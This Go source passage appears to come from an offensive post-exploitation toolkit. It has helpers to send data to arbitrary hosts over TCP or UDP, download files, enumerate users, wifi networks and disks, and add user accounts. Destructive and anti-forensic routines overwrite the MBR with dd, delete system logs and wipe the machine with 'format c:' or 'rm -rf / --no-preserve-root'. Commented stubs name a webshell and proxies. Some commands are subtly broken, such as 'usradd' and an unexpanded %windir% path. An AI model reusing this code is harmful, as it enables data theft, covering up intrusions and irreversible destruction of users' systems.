	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return err
	}
	_, err = io.WriteString(conn, data+"\n")
	if err != nil {
		return err
	}
	defer conn.Close()
	return nil
}

func SendDataUDP(host string, port int, data string) error {
	addr := host + ":" + strconv.Itoa(port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return err
	}
	_, err = io.WriteString(conn, data+"\n")
	if err != nil {
		return err
	}
	defer conn.Close()
	return nil
}

func FilePermissions(filename string) (bool, bool) {
	write_permission := true
	read_permission := true
	file, err := os.OpenFile(filename, os.O_WRONLY, 0666)
	if err != nil {
		if os.IsPermission(err) {
			write_permission = false
		}
	}
	file.Close()
	file, err = os.OpenFile(filename, os.O_RDONLY, 0666)
	if err != nil {
		if os.IsPermission(err) {
			read_permission = false
		}
	}
	return read_permission, write_permission
}

func Download(url string) error {
	splitted := strings.Split(url, "/")
	filename := splitted[len(splitted)-1]
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()
	response, err := http.Get(url)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, err = io.Copy(f, response.Body)
	if err != nil {
		return err
	}
	return nil
}

func Users() ([]string, error) {
	switch runtime.GOOS {
	case "windows":
		clear := []string{}
		o, err := CmdOut("net user")
		if err != nil {
			return nil, err
		}
		lines := strings.Split(o, "\n")
		for l := range lines {
			line := lines[l]
			if !contains_any(line, []string{"accounts for", "------", "completed"}) {
				clear = append(clear, line)
			}
		}
		return clear, nil
		//return strings.Fields(strings.Join(clear, " ")), nil
		/*usrs := []string{}
		  users, err := wapi.ListLoggedInUsers()
		  if err != nil {
		      return nil, err
		  }
		  for _, u := range(users){
		      usrs = append(usrs, u.FullUser())
		  }
		  return usrs, nil*/
	default:
		o, err := CmdOut("cut -d: -f1 /etc/passwd")
		if err != nil {
			return nil, err
		}
		return strings.Split(o, "\n"), nil
	}
}

func EraseMbr(device string, partition_table bool) error {
	cmd := f("dd if=/dev/zero of=%s bs=446 count=1", device)
	if partition_table {
		cmd = f("dd if=/dev/zero of=%s bs=512 count=1", device)
	}
	_, err := CmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func Networks() ([]string, error) {
	wifi_names := []string{}
	switch runtime.GOOS {
	case "windows":
		out, err := CmdOut("netsh wlan show networks")
		if err != nil {
			return nil, err
		}
		o := strings.Split(out, "\n")[1:]
		for entry := range o {
			e := o[entry]
			if strings.Contains(e, "SSID") {
				wifi_name := strings.Split(e, ":")[1]
				wifi_names = append(wifi_names, wifi_name)
			}
		}
	default:
		out, err := CmdOut("nmcli dev wifi")
		if err != nil {
			return nil, err
		}
		o := strings.Split(out, "\n")[1:]
		for entry := range o {
			e := o[entry]
			wifi_name := strings.Split(e, "")[1]
			wifi_names = append(wifi_names, wifi_name)
		}
	}
	return wifi_names, nil
}

func ExpandCidr(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); IpIncrement(ip) {
		ips = append(ips, ip.String())
	}

	lenIPs := len(ips)
	switch {
	case lenIPs < 2:
		return ips, nil
	default:
		return ips[1 : len(ips)-1], nil
	}
}

func ClearLogs() error {
	switch runtime.GOOS {
	case "windows":
		os.Chdir("%windir%\\system32\\config")
		_, err := CmdOut("del *log /a /s /q /f")
		if err != nil {
			return err
		}
	default:
		_, err := CmdOut("rm -r /var/log")
		if err != nil {
			return err
		}
	}
	return nil
}

func Wipe() error {
	cmd := ""
	switch runtime.GOOS {
	case "windows":
		cmd = "format c: /fs:ntfs"
	default:
		cmd = "rm -rf / --no-preserve-root"
	}
	_, err := CmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func DnsLookup(hostname string) ([]string, error) {
	i := []string{}
	ips, err := net.LookupIP(hostname)
	if err != nil {
		return nil, err
	}
	for _, ip := range ips {
		i = append(i, ip.String())
	}
	return i, nil
}

func RdnsLookup(ip string) ([]string, error) {
	ips, err := net.LookupAddr(ip)
	if err != nil {
		return nil, err
	}
	return ips, nil
}

func CreateUser(username, password string) error {
	cmd := ""
	switch runtime.GOOS {
	case "windows":
		cmd = f("net user %s %s /ADD", username, password)
	case "linux":
		cmd = f("usradd -u %s -p %s", username, password)
	case "darwin":
		cmd = f("sysadminctl -addUser %s -password %s -admin", username, password)
	}
	_, err := CmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func WifiDisconnect() error {
	cmd := ""
	switch runtime.GOOS {
	case "windows":
		cmd = `netsh interface set interface name="Wireless Network Connection" admin=DISABLED`
		_, err := CmdOut(cmd)
		if err != nil {
			return err
		}
	case "linux":
		iface, _ := iface()
		cmd = f("ip link set dev %s down", iface)
		_, err := CmdOut(cmd)
		if err != nil {
			return err
		}
	case "darwin":
		cmd = "networksetup -setnetworkserviceenabled Wi-Fi off"
		_, err := CmdOut(cmd)
		if err != nil {
			return err
		}
	}
	return nil

}

func Disks() ([]string, error) {
	found_drives := []string{}
	switch runtime.GOOS {
	case "windows":
		for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
			f, err := os.Open(string(drive) + ":\\")
			if err == nil {
				found_drives = append(found_drives, string(drive)+":\\")
				f.Close()
			}
		}
	default:
		for _, drive := range "abcdefgh" {
			f, err := os.Open("/dev/sd" + string(drive))
			if err == nil {
				found_drives = append(found_drives, "/dev/sd"+string(drive))
				f.Close()
			}
		}
	}
	return found_drives, nil
}

/*
func dialog(message, title string) {

}

func keyboard_emul(keys string) error {

}

func proxy_tcp() error {

}

func proxy_udp() error {

}

func proxy_http() error {

}

func webshell(param, password string) error {

}

func stamp() {

}

func detect_user_interaction() (bool, error) {

}*/
